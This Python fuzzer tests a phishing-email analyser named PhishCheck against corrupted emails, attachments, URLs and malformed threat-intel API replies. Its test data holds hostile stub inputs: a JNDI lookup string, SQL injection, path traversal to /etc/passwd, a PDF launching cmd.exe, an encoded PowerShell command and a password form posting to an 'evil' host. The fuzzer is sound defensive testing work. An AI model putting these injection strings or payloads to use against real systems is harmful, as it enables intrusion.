"""Fuzzer for PhishCheck. Deterministic (seeded), with a watchdog for hangs.

    python -X utf8 tests/fuzz.py [--cases N] [--seed S] [--stage NAME ...]
    python -X utf8 tests/fuzz.py --repro STAGE SEED        # re-run one failing case with a full traceback

Stages
  mutate-eml   corrupt real phishing emails (bit flips, truncation, header bombs, broken MIME ...)
  gen-eml      generate hostile emails from scratch (nasty addresses, URLs, filenames, attachments)
  attach       static analysers against corrupted PE / PDF / zip / OOXML / OLE / RTF blobs
  checks       link and header heuristics against hostile strings
  api-shape    online-lookup parsing against malformed provider responses (no network is used)
  msg          garbage .msg files must fail cleanly, never hang
  gui          hostile emails pushed through the real window (offscreen)

A case FAILS if it raises where the app is expected to cope, or takes longer than the watchdog allows.
Exit code 1 if anything failed.
"""
import argparse
import base64
import collections
import io
import json
import multiprocessing as mp
import os
import queue
import random
import sys
import tempfile
import time
import traceback
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

CASE_TIMEOUT = float(os.environ.get("FUZZ_TIMEOUT", "25"))  # seconds without progress before a case counts as a hang
SLOW_CASE = 3.0
CORPUS = ROOT / "tests" / "corpus"

NASTY_STRINGS = [
    "", " ", "\x00", "a" * 70000, "<>", "<<<>>>", '"', '""""', "\\", "@", "@@@", "a@", "@b.com", "a@b@c.com",
    "‮exe.fdp", "\U0001d5e3\U0001d5ee\U0001d6fe <x@y.com>", "Ünïℂode <ü@exämple.com>",
    "=?utf-8?b?AAAA?=", "=?bogus?q?abc?=", "=?utf-8?q?=ZZ?=", "x" * 300 + "@" + "y" * 300 + ".com", "a@[127.0.0.1]",
    "a@[IPv6:::1]", "\r\n", "\n\n\n", "A\x0bB", "\U0001f4a5" * 500, "<a@b.com>, <c@d.com>", "'; DROP TABLE x;--",
    "{{7*7}}", "%s%s%s%n", "${jndi:ldap://x}", "../../etc/passwd", "Microsoft <a@b.com>", "PayPal <a@paypa1.com>",
    "D̲o̲c̲u̲S̲i̲g̲n̲ <a@b.co>",
    "z​​​​​​​​​​​​​​​​​​​​​​z",
]
NASTY_URLS = [
    "http://[::1", "http://[::1]:80/", "http://:80", "http://@", "http://a@b@c/", "http://", "https://",
    "http://" + "a" * 100000 + ".com", "javascript:alert(1)", "data:text/html;base64,AAAA", "mailto:a@b.com",
    "http://exa mple.com", "http://例え.jp/", "http://xn--e1afmkfd.xn--p1ai", "http://user:pass@host:99999/",
    "ht!tp://x", "//example.com", "http://1.2.3.4.5", "http://999.999.999.999", "http://0x7f.1/", "http://[v1.fe]/",
    "http://\x00/", "http://a.b.c.d.e.f.g.h.i.j/", "http://paypal.com.evil.ru", "http://micros0ft-login.top/a?b=c#d",
    "HTTP://UPPER.COM", "http://trailing.dot./", "http://.leading.dot", "http://a..b/", "http://-.com", "http://%41.com",
    "http://a.com\\@evil.com", "https://www.google.com.br-1234convites@x.run.app", "http://\U0001d5e3ay\U0001d5e3al.com",
]
_PE_CACHE = []


def _pe_bytes() -> bytes:
    if not _PE_CACHE:
        _PE_CACHE.append(Path(sys.executable).read_bytes()[:400_000])  # a real, valid PE to corrupt
    return _PE_CACHE[0]


# ---------------------------------------------------------------- generators
def mutate(rng: random.Random, data: bytes) -> bytes:
    data = bytearray(data)
    for _ in range(rng.randint(1, 4)):
        op = rng.randrange(11)
        if not data:
            data = bytearray(b"From: a@b.c\r\n\r\nx")
        i = rng.randrange(len(data))
        if op == 0:  # bit flips
            for _ in range(rng.randint(1, 60)):
                data[rng.randrange(len(data))] ^= 1 << rng.randrange(8)
        elif op == 1:  # truncate
            del data[i:]
        elif op == 2:  # delete a slice
            del data[i:i + rng.randint(1, 5000)]
        elif op == 3:  # duplicate a slice many times
            chunk = bytes(data[i:i + rng.randint(1, 400)])
            data[i:i] = chunk * rng.randint(2, 300)
        elif op == 4:  # insert random / NUL / high-bit bytes
            data[i:i] = bytes(rng.choice([0, 255, rng.randrange(256)]) for _ in range(rng.randint(1, 500)))
        elif op == 5:  # header bomb: one gigantic header line
            data[0:0] = b"X-Bomb: " + b"A" * rng.randint(10_000, 300_000) + b"\r\n"
        elif op == 6:  # thousands of headers
            data[0:0] = b"".join(b"X-H%d: v\r\n" % k for k in range(rng.randint(1000, 8000)))
        elif op == 7:  # line-ending chaos
            data = bytearray(bytes(data).replace(b"\r\n", rng.choice([b"\n", b"\r", b"\n\r", b"\r\r\n"])))
        elif op == 8:  # remove header/body separator
            data = bytearray(bytes(data).replace(b"\r\n\r\n", b"\r\n", 1).replace(b"\n\n", b"\n", 1))
        elif op == 9:  # junk charsets / encoded words
            data[0:0] = rng.choice([b"Subject: =?bogus-9?Q?abc?=\r\n", b"Subject: =?utf-8?b?!!!?=\r\n",
                                    b"Content-Type: text/plain; charset=nonsense\r\n", b"From: =?utf-8?q?=ZZ?= <a@b.c>\r\n"])
        else:  # break base64 / boundaries
            data = bytearray(bytes(data).replace(b"boundary=", b"boundary=\"").replace(b"=\r\n", b"==\r\n"))
    return bytes(data)


def _val(rng):
    r = rng.random()
    if r < 0.45:
        return rng.choice(NASTY_STRINGS)
    if r < 0.7:
        return f"{rng.choice(NASTY_STRINGS)[:50]} <{rng.choice(NASTY_STRINGS)[:40]}>"
    return rng.choice(["Microsoft <x@evil.top>", "a@b.com", "Bob <bob@example.org>", "PayPal Support <help@paypa1-secure.xyz>"])


def gen_blob(rng: random.Random) -> bytes:
    kind = rng.randrange(12)
    if kind == 9:  # HTML / SVG carriers, incl. pathological markup
        page = rng.choice([
            b"<html><body><form action='http://evil/x'><input type=password></form></body></html>",
            b"<script>var b=new Blob([atob('AAAA')]);location='http://x/';eval(unescape('%41'))</script>",
            b"<svg xmlns='http://www.w3.org/2000/svg'><script>x</script></svg>",
            b"<meta http-equiv=refresh content='0;url=http://x'><a href='data:text/html;base64,AAA'>",
            b"<" * 500000, b"<script" * 100000, b"<form " * 80000, b"\xef\xbb\xbf" + b"<html>" + b"\xff" * 5000])
        return mutate(rng, page) if rng.random() < 0.6 else page
    if kind == 10:  # OneNote
        return mutate(rng, b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3" +
                      rng.choice([b"", b"This program cannot be run in DOS mode", b"powershell -enc AAAA", b"\x00" * 2000]))
    if kind == 11:  # hostile filename extensions on random content
        return bytes(rng.randrange(256) for _ in range(rng.randint(0, 3000)))
    if kind == 0:
        return mutate(rng, _pe_bytes())
    if kind == 1:
        pdf = b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app.alert(1))>>>>endobj\n" \
              b"2 0 obj<</Launch<</F(cmd.exe)>>/EmbeddedFile/URI(http://x)>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF"
        return mutate(rng, pdf)
    if kind in (2, 3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            names = rng.choice([["a.txt"], ["../../evil.exe", "x.js"], ["word/document.xml", "[Content_Types].xml"],
                                [f"f{i}.txt" for i in range(rng.randint(1, 3000))], ["‮gpj.exe", "con.exe", ""]])
            for n in names:
                try:
                    z.writestr(n or "empty", b"hello" * rng.randint(0, 50))
                except Exception:
                    pass
            if kind == 3:  # OOXML with hostile relationships
                z.writestr("word/_rels/document.xml.rels", rng.choice([
                    '<Relationships><Relationship TargetMode="External" Target="http://evil/t.dotm"/></Relationships>',
                    "<Relationships", "\x00\x01", '<Relationship Target="' + "A" * 100000 + '" TargetMode="External"/>']))
        return mutate(rng, buf.getvalue()) if rng.random() < 0.7 else buf.getvalue()
    if kind == 4:
        return b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(rng.randrange(256) for _ in range(rng.randint(0, 6000)))
    if kind == 5:
        return b"{\\rtf1" + rng.choice([b"\\objdata ", b"{\\*\\x", b"\\bin0", b"}" * 500]) + bytes(rng.randrange(256) for _ in range(300))
    if kind == 6:
        return b""
    if kind == 7:
        return bytes(3_000_000)  # a few MB of zeros
    return bytes(rng.randrange(256) for _ in range(rng.randint(1, 50000)))


def gen_email(rng: random.Random) -> bytes:
    b = f"BND{rng.randrange(10 ** 8)}"
    sep = rng.choice(["\r\n", "\n"])
    lines = []
    for name in ("From", "Reply-To", "Return-Path", "To", "Subject", "Date", "Authentication-Results", "Received", "X-Mailer"):
        if rng.random() < 0.85:
            v = _val(rng)
            if name == "Authentication-Results" and rng.random() < 0.6:
                v = rng.choice(["spf=pass dkim=pass dmarc=pass", "spf=fail", "dkim=weird dmarc=", "spf= spf=pass", "SPF=PASS"])
            lines.append(f"{name}: {v}")
    lines += ["MIME-Version: 1.0", f'Content-Type: multipart/{rng.choice(["mixed", "alternative", "related"])}; boundary="{b}"', ""]

    def urls(n):
        return " ".join(rng.choice(NASTY_URLS + ["http://example.com/x", "https://github.com/a"]) for _ in range(n))

    body = [f"--{b}", "Content-Type: text/plain; charset=utf-8", "", f"{_val(rng)} {urls(rng.randint(0, 6))}", ""]
    if rng.random() < 0.8:
        links = "".join(f'<a href="{rng.choice(NASTY_URLS)}">{_val(rng)[:80]}</a>' for _ in range(rng.randint(0, 25)))
        extra = rng.choice(["", "<form><input name=p></form>", "<script>x</script>", "<meta http-equiv=refresh content='0;url=x'>",
                            "<a href=>", "<a", "<<<>>>", "<a href='x'" * 200, "&#x110000;&bad;", "​" * 50])
        body += [f"--{b}", "Content-Type: text/html; charset=utf-8", "", f"<html><body>{links}{extra}</body></html>", ""]
    for _ in range(rng.randint(0, 3)):
        fn = rng.choice(["a.exe", "invoice.pdf.exe", "‮gpj.exe", "..\\..\\evil.exe", "", "x" * 3000, "con", "a\x00b.doc", "résumé.docm"])
        blob = base64.encodebytes(gen_blob(rng)).decode()
        body += [f"--{b}", f'Content-Type: application/octet-stream; name="{fn}"', "Content-Transfer-Encoding: base64",
                 f'Content-Disposition: attachment; filename="{fn}"', "", blob]
    body.append(f"--{b}--" if rng.random() < 0.9 else "")
    return sep.join(lines + body).encode("utf-8", "surrogateescape")


# ---------------------------------------------------------------- cases (each raises on failure)
def _run_pipeline(path: str):
    from phishcheck import analyzer, intel, parser, report

    pe = parser.parse_file(path)
    r = analyzer.analyze(pe)
    report.to_html(r)
    intel.build_targets(pe)


def case_mutate_eml(seed: int):
    rng = random.Random(seed)
    files = sorted(CORPUS.glob("*.eml"))
    if not files:
        raise RuntimeError("tests/corpus is empty: run tests/fetch_corpus.py first")
    data = mutate(rng, rng.choice(files).read_bytes())
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "fuzz.eml"
        p.write_bytes(data)
        _run_pipeline(str(p))


def case_gen_eml(seed: int):
    data = gen_email(random.Random(seed))
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "fuzz.eml"
        p.write_bytes(data)
        _run_pipeline(str(p))


def case_attach(seed: int):
    from phishcheck import static_analysis
    from phishcheck.models import Attachment
    import hashlib

    rng = random.Random(seed)
    data = gen_blob(rng)
    name = rng.choice(["a.exe", "doc.docm", "x.pdf", "y.xlsx", "z.zip", "q.doc", "w.rtf", "invoice.pdf.exe", "", "noext", "‮cod.exe",
                       "page.html", "page.htm", "pic.svg", "note.one", "x.onepkg", "a.mht", "evil.xll", "l.url"])
    att = Attachment(filename=name, data=data, size=len(data), sha256=hashlib.sha256(data).hexdigest())
    static_analysis.analyze(att)


def case_checks(seed: int):
    from phishcheck import analyzer, checks
    from phishcheck.models import Link, ParsedEmail

    rng = random.Random(seed)
    for _ in range(8):
        checks.check_link(rng.choice(NASTY_URLS + NASTY_STRINGS), rng.choice(NASTY_STRINGS))
    pe = ParsedEmail(source="x", subject=_val(rng), sender=_val(rng), reply_to=_val(rng), return_path=_val(rng),
                     body_text=_val(rng), body_html=_val(rng),
                     headers=[(_val(rng)[:30] or "H", _val(rng)) for _ in range(rng.randint(0, 6))])
    pe.links = [Link(href=rng.choice(NASTY_URLS), text=_val(rng)) for _ in range(rng.randint(0, 12))]
    analyzer.analyze(pe)


def _fake_json(rng, depth=0):
    r = rng.random()
    if depth > 3 or r < 0.2:
        return rng.choice([None, 0, -1, 1.5, "", "x", True, "‮", 10 ** 20])
    if r < 0.5:
        return [_fake_json(rng, depth + 1) for _ in range(rng.randint(0, 4))]
    keys = ["data", "attributes", "last_analysis_stats", "last_analysis_results", "malicious", "suspicious", "harmless",
            "undetected", "popular_threat_classification", "suggested_threat_label", "popular_threat_name", "value",
            "category", "result", "categories", "creation_date", "registrar", "reputation", "size", "type_description",
            "first_submission_date", "last_analysis_date", "meaningful_name", "query_status", "threat", "url_status"]
    return {rng.choice(keys): _fake_json(rng, depth + 1) for _ in range(rng.randint(0, 6))}


def case_api_shape(seed: int):
    from phishcheck import intel, report
    from phishcheck.models import Report, ParsedEmail

    rng = random.Random(seed)

    class Resp:
        def __init__(self):
            self.status_code = rng.choice([200, 200, 200, 404, 401, 403, 429, 500, 502, 204])
            self._j = _fake_json(rng) if rng.random() < 0.9 else None
            if rng.random() < 0.3 and isinstance(self._j, dict):  # well-formed VT-ish reply with hostile leaves
                self._j = {"data": {"attributes": {"last_analysis_stats": _fake_json(rng), "last_analysis_results": _fake_json(rng),
                                                   "popular_threat_classification": _fake_json(rng)}}}

        def json(self):
            if self._j is None:
                raise ValueError("not json")
            return self._j

    def fake(*a, **k):
        if rng.random() < 0.05:
            raise intel.requests.ConnectionError("boom")
        return Resp()

    saved = (intel.requests.get, intel.requests.post, intel._cached, intel._vt_limiter.wait, os.environ.get("VT_API_KEY"),
             os.environ.get("ABUSECH_AUTH_KEY"))
    intel.requests.get = intel.requests.post = fake
    intel._cached = lambda key, fetch: fetch()
    intel._vt_limiter.wait = lambda cancel, notify: True
    os.environ["VT_API_KEY"] = os.environ["ABUSECH_AUTH_KEY"] = "fuzz"
    try:
        for t in ({"kind": "file", "label": "a.exe", "sha256": "0" * 64},
                  {"kind": "url", "label": "x.com", "url": "http://x.com/a", "host": "x.com"}):
            res = intel.lookup(t)
            for r in (res["vt"], res["abuse"]):
                if not isinstance(r, dict) or "status" not in r:
                    raise AssertionError(f"lookup returned a malformed result: {r!r}")
            intel.describe_vt(res["vt"])
            intel.describe_abuse(res["abuse"])
            intel.to_findings(t, res)
            intel.detail_html(t, res)
            rep = Report(email=ParsedEmail(source="x"))
            rep.intel = [(t, res)]
            report.to_html(rep)
    finally:
        (intel.requests.get, intel.requests.post, intel._cached, intel._vt_limiter.wait, vt, ab) = saved
        for k, v in (("VT_API_KEY", vt), ("ABUSECH_AUTH_KEY", ab)):
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def case_msg(seed: int):
    from phishcheck import parser

    rng = random.Random(seed)
    data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(rng.randrange(256) for _ in range(rng.randint(0, 20000)))
    with tempfile.TemporaryDirectory() as td:
        p = Path(td) / "fuzz.msg"
        p.write_bytes(data)
        try:
            parser.parse_file(str(p))
        except Exception:
            pass  # failing cleanly with an error message is exactly right; hanging is not


STAGES = {"mutate-eml": case_mutate_eml, "gen-eml": case_gen_eml, "attach": case_attach, "checks": case_checks,
          "api-shape": case_api_shape, "msg": case_msg}
DEFAULT_COUNTS = {"mutate-eml": 1500, "gen-eml": 1000, "attach": 1500, "checks": 4000, "api-shape": 1500, "msg": 150}


# ---------------------------------------------------------------- watchdog runner
def _child(stage, seeds, q, cur):
    fn = STAGES[stage]
    for seed in seeds:
        cur.value = seed  # shared memory: readable by the parent even while a regex hogs the GIL
        t0 = time.time()
        try:
            fn(seed)
        except BaseException as exc:  # noqa: BLE001: the fuzzer must see everything
            tb = traceback.extract_tb(exc.__traceback__)
            where = f"{Path(tb[-1].filename).name}:{tb[-1].lineno}" if tb else "?"
            q.put(("fail", seed, f"{type(exc).__name__}: {str(exc)[:90]!r} @ {where}", traceback.format_exc(limit=6)))
        dt = time.time() - t0
        if dt > SLOW_CASE:
            q.put(("slow", seed, dt))
    cur.value = -2  # finished
    q.put(("done",))


def run_stage(stage: str, count: int, base_seed: int):
    ctx = mp.get_context("spawn")
    seeds = list(range(base_seed, base_seed + count))
    failures, slow = collections.defaultdict(list), []
    done = 0
    while seeds:
        q, cur = ctx.Queue(), ctx.Value("q", -1)
        p = ctx.Process(target=_child, args=(stage, list(seeds), q, cur), daemon=True)
        p.start()
        first, last_seed, last_change, finished = seeds[0], -1, time.time(), False
        while not finished:
            try:
                msg = q.get(timeout=0.5)
                if msg[0] == "fail":
                    failures[msg[2]].append((msg[1], msg[3]))
                elif msg[0] == "slow":
                    slow.append((msg[1], round(msg[2], 1)))
                elif msg[0] == "done":
                    done += len(seeds)
                    finished, seeds = True, []
                continue
            except queue.Empty:
                pass
            if cur.value != last_seed:
                last_seed, last_change = cur.value, time.time()
            hung = time.time() - last_change > CASE_TIMEOUT
            if hung or not p.is_alive():
                seed = cur.value
                kind = f"HANG (> {CASE_TIMEOUT:.0f}s)" if hung else "PROCESS CRASH"
                failures[kind].append((seed, f"{kind} on seed {seed}"))
                p.kill()
                done += max(seed - first + 1, 1)
                seeds = [x for x in seeds if x > seed]
                break
        p.join(timeout=5)
        if p.is_alive():
            p.kill()
    return done, failures, slow


def run_gui_stage(count: int, base_seed: int):
    os.environ["QT_QPA_PLATFORM"] = "offscreen"
    from PySide6.QtWidgets import QApplication
    from phishcheck import analyzer, gui, parser

    app = QApplication([])
    app.setStyle("Fusion")
    app.setStyleSheet(gui.STYLE)
    w = gui.Main()
    w.show()
    failures = collections.defaultdict(list)
    for seed in range(base_seed, base_seed + count):
        try:
            with tempfile.TemporaryDirectory() as td:
                p = Path(td) / "g.eml"
                p.write_bytes(gen_email(random.Random(seed)))
                r = analyzer.analyze(parser.parse_file(str(p)))
            w.report = r
            w.show_report(r)
            w._fill_intel_table(False)
            app.processEvents()
        except BaseException as exc:  # noqa: BLE001
            tb = traceback.extract_tb(exc.__traceback__)
            where = f"{Path(tb[-1].filename).name}:{tb[-1].lineno}" if tb else "?"
            failures[f"{type(exc).__name__}: {str(exc)[:90]!r} @ {where}"].append((seed, traceback.format_exc(limit=6)))
    w.close()
    return count, failures, []


def report_stage(name, done, failures, slow):
    n_fail = sum(len(v) for v in failures.values())
    print(f"\n[{name}] {done} cases, {n_fail} failure(s), {len(slow)} slow")
    for key, items in sorted(failures.items(), key=lambda kv: -len(kv[1])):
        first = items[0]
        seed = first[0] if isinstance(first, tuple) else first
        print(f"   x{len(items):<4} {key}   (first seed {seed})")
        if isinstance(first, tuple):
            print("        " + first[1].strip().splitlines()[-1][:160])
    if slow:
        print(f"   slow cases (seed, seconds): {sorted(slow, key=lambda x: -x[1])[:5]}")
    return n_fail


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cases", type=int, help="cases per stage (default: a sensible number per stage)")
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--stage", nargs="*", choices=list(STAGES) + ["gui"])
    ap.add_argument("--repro", nargs=2, metavar=("STAGE", "SEED"))
    a = ap.parse_args()

    if a.repro:
        STAGES[a.repro[0]](int(a.repro[1]))
        print("no failure on this seed")
        return

    total_fail, t0 = 0, time.time()
    for stage in a.stage or [*STAGES, "gui"]:
        n = a.cases or (150 if stage == "gui" else DEFAULT_COUNTS[stage])
        s0 = time.time()
        done, failures, slow = run_gui_stage(n, a.seed) if stage == "gui" else run_stage(stage, n, a.seed)
        total_fail += report_stage(stage, done, failures, slow)
        print(f"   ({time.time() - s0:.0f}s)")
    print(f"\n=== FUZZ COMPLETE: {total_fail} failure(s) in {time.time() - t0:.0f}s ===")
    sys.exit(1 if total_fail else 0)


if __name__ == "__main__":
    main()
